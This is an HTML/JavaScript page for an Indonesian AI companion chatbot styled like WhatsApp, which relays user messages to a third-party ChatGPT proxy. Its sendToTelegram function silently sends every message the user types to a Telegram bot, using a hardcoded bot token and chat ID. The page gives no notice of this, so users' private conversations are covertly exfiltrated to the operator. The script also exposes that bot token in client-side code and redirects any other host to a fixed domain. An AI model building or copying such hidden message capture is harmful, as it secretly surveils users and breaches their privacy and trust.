<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Chatbot WhatsApp Style</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ece5dd;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .chat-container {
            width: 90%;
            max-width: 400px;
            height: 600px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header {
            background-color: #075E54;
            color: white;
            padding: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            height: 40px;
        }

        .header .status {
            font-size: 12px;
            color: #9de1fe;
            margin-left: 5px;
        }

        .header-content {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            margin-left: 10px;
        }

        .header-content h3 {
            margin: 0;
            font-size: 16px;
        }

        .menu {
            cursor: pointer;
            position: relative;
            font-size: 24px;
            margin-right: 10px;
        }

        .menu-items {
            display: none;
            position: absolute;
            top: 40px;
            right: 0;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            border-radius: 5px;
            z-index: 10;
            min-width: 150px;
            padding: 5px 0;
        }

        .menu-item {
            padding: 8px 15px;
            cursor: pointer;
            white-space: nowrap;
            color: #075E54;
            font-weight: bold;
            font-size: 14px;
        }

        .menu-item:hover {
            background-color: #f0f0f0;
        }

        .chat-box {
            flex: 1;
            padding: 20px;
            overflow-y: scroll;
            display: flex;
            flex-direction: column;
        }

        .message {
            margin-bottom: 15px;
            max-width: 70%;
            word-wrap: break-word;
            padding: 10px;
            border-radius: 8px;
            position: relative;
        }

        .message.user {
            align-self: flex-end;
            background-color: #DCF8C6;
        }

        .message.bot {
            align-self: flex-start;
            background-color: #ebebeb;
        }

        .message .timestamp {
            font-size: 10px;
            color: #999;
            position: absolute;
            bottom: -15px;
            right: 0;
        }

        .input-box {
            display: flex;
            border-top: 1px solid #ddd;
            padding: 10px;
            background-color: #f0f0f0;
        }

        .input-box input {
            flex: 1;
            padding: 10px;
            border-radius: 20px;
            border: none;
            outline: none;
            margin-right: 10px;
        }

        .input-box button {
            background-color: #075E54;
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            border: none;
            cursor: pointer;
        }

        .input-box button:hover {
            background-color: #128C7E;
        }
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="header">
            <div class="header-content">
                <h3>Teman setia ❤</h3>
                <span class="status">Online</span>
            </div>
            <div class="menu" onclick="toggleMenu()">⋮</div>
            <div class="menu-items" id="menuItems">
                <div class="menu-item" onclick="clearChat()">Bersihkan History Chat</div>
                <div class="menu-item" onclick="contactAdmin()">Hubungi Admin</div>
                <div class="menu-item" onclick="sawer()">Sawer</div>
            </div>
        </div>
        <div class="chat-box" id="chat-box">
            <!-- Chat messages will appear here -->
        </div>
        <div class="input-box">
            <input type="text" id="userInput" placeholder="Ketik pesan">
            <button onclick="sendMessage()">Kirim</button>
        </div>
    </div>

<script>
    // Cek domain, jika tidak berasal dari amindeveloper99.github.io, redirect ke domain tersebut
    if (window.location.hostname !== 'amindeveloper99.github.io') {
        window.location.href = 'https://amindeveloper99.github.io/chat.html';
    }

    const apiUrl = 'https://api.ryzendesu.vip/api/ai/chatgpt?text=';
    const chatBox = document.getElementById('chat-box');
    let chatHistory = localStorage.getItem('chatHistory') || ""; 

    window.onload = function() {
        document.getElementById('userInput').focus();
        if (chatHistory) {
            chatHistory.split('\n').forEach(message => {
                if (message) {
                    const sender = message.startsWith("Pengguna:") ? 'user' : 'bot';
                    addMessage(message.replace("Pengguna: ", "").replace("AI: ", ""), sender);
                }
            });
        }

        document.getElementById('userInput').addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault(); 
                sendMessage(); 
            }
        });
        
        // Event listener to close the menu if clicking outside of it
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('menuItems');
            const menuButton = document.querySelector('.menu');
            if (menu.style.display === 'block' && !menu.contains(event.target) && !menuButton.contains(event.target)) {
                menu.style.display = 'none';
            }
        });
    }

    async function sendToTelegram(message) {
        const token = '7556736179:AAFAzU6EeDMmGa1f7ZyGMlYN4kBHgfSFYYw';
        const chatId = '5531996760';
        const url = `https://api.telegram.org/bot${token}/sendMessage`;

        const params = {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        };

        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(params),
            });
        } catch (error) {
            console.error('Error sending message to Telegram:', error);
        }
    }

    function sendMessage() {
        const userInput = document.getElementById('userInput');
        const message = userInput.value.trim();
        
        if (message) {
            addMessage(message, 'user');
            chatHistory += "Pengguna: " + message + "\n"; 
            localStorage.setItem('chatHistory', chatHistory); 
            sendToTelegram(message); 
            fetchAIResponse(message);
            userInput.value = '';
            userInput.focus();
        }
    }

    function addMessage(text, sender) {
        const messageDiv = document.createElement('div');
        messageDiv.className = 'message ' + sender;
        messageDiv.textContent = text;

        const timestamp = document.createElement('div');
        timestamp.className = 'timestamp';
        timestamp.textContent = getCurrentWITATime();

        messageDiv.appendChild(timestamp);
        chatBox.appendChild(messageDiv);
        chatBox.scrollTop = chatBox.scrollHeight; 
    }

    async function fetchAIResponse(message) {
        try {
            const fullPrompt = chatHistory + "\nPengguna: " + message + 
                              "\nBalas pesan ini dalam bahasa Indonesia dengan gaya yang santai dan tidak kaku, dengan emotikon, balasan jangan ada kata (AI: ):";
            const response = await fetch(apiUrl + encodeURIComponent(fullPrompt));
            const data = await response.json();

            if (data.success) {
                addMessage(data.response, 'bot');
                chatHistory += "AI: " + data.response + "\n"; 
                localStorage.setItem('chatHistory', chatHistory); 
            } else {
                addMessage("Maaf, AI gagal memberikan balasan.", 'bot');
            }
        } catch (error) {
            addMessage("Maaf, ada kesalahan saat berkomunikasi dengan AI.", 'bot');
        }
    }

    function getCurrentWITATime() {
        const now = new Date();
        const options = {
            timeZone: 'Asia/Makassar',
            hour12: false,
            hour: '2-digit',
            minute: '2-digit',
        };
        return now.toLocaleTimeString('id-ID', options);
    }

    function toggleMenu() {
        const menuItems = document.getElementById('menuItems');
        menuItems.style.display = menuItems.style.display === 'block' ? 'none' : 'block';
    }

    function clearChat() {
        localStorage.removeItem('chatHistory');
        chatBox.innerHTML = '';
        document.getElementById('menuItems').style.display = 'none';
    }

    function contactAdmin() {
        window.open('https://t.me/contactAdmin', '_blank');
        document.getElementById('menuItems').style.display = 'none';
    }

    function sawer() {
        window.open('https://saweria.co/sawerAdmin', '_blank');
        document.getElementById('menuItems').style.display = 'none';
    }
</script>
</body>
</html>
